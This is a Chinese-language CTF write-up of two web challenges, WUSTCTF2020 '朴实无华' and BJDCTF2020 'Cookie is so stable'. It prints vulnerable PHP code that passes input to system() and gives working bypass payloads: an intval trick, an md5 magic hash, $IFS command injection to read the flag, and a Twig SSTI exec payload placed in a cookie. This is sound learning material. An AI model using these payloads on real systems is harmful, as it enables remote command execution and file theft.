## [WUSTCTF2020]朴实无华

### 1.用`dirsearch`进行把爆破扫描

访问robots.txt,发现有个文件，直接进去发现没有flag，抓包进去看发现有个文件叫fl4g.php,直接进去发现，可以访问出现代码审计，

<?php
header('Content-type:text/html;charset=utf-8');
error_reporting(0);
highlight_file(__file__);

//level 1
if (isset($_GET['num'])){
    $num = $_GET['num'];
    if(intval($num) < 2020 && intval($num + 1) > 2021){
        echo "我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.</br>";
    }else{
        die("金钱解决不了穷人的本质问题");
    }
}else{
    die("去非洲吧");
}
//level 2
if (isset($_GET['md5'])){
   $md5=$_GET['md5'];
   if ($md5==md5($md5))
       echo "想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.</br>";
   else
       die("我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲");
}else{
    die("去非洲吧");
}

//get flag
if (isset($_GET['get_flag'])){
    $get_flag = $_GET['get_flag'];
    if(!strstr($get_flag," ")){
        $get_flag = str_ireplace("cat", "wctf2020", $get_flag);
        echo "想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.</br>";
        system($get_flag);
    }else{
        die("快到非洲了");
    }
}else{
    die("去非洲吧");
}
?> 
第一关intval函数的宽松处理，在获取整数中如果有字符直接截断

第一个可以用科学技术法2e4，这样就是第一个是2，第二个是进行计算时，字符串可以先转化成数字再进行计算，这样就是20001大于2021绕过

第二关：md5后的数字还是该数字，

### 0e215962017

第三关：`strstr($ get_flag," ")`:用于判断字符串空格是否是$ get_flag的子串（过滤空格）直接先ls，再tac$IFSfllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag



## [BJDCTF2020]Cookie is so stable



解题
一开始看到题目提示cookie 先抓一个包试试

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210413170814810.png)没发现什么问题，点开另一个网页

![在这里插入图片描述](https://img-blog.csdnimg.cn/2021041317084045.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDQ3NzIyMw==,size_16,color_FFFFFF,t_70)

感觉是注入的题目，但是sql注入没啥反应。但是你输入什么他就会回显什么

联想到SSTI注入，构造PL进行尝试：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210413175713892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDQ3NzIyMw==,size_16,color_FFFFFF,t_70)

发现确实能够利用SSTI

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210413175747195.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDQ3NzIyMw==,size_16,color_FFFFFF,t_70)

判断是twig,构造PL：{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

发现不是在这里绕过，我们抓取一个登录的包

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210413180237706.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDQ3NzIyMw==,size_16,color_FFFFFF,t_70)

发现注入的点在COOKIE里面

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210413180114488.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDQ3NzIyMw==,size_16,color_FFFFFF,t_70)


注入

PL:{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}

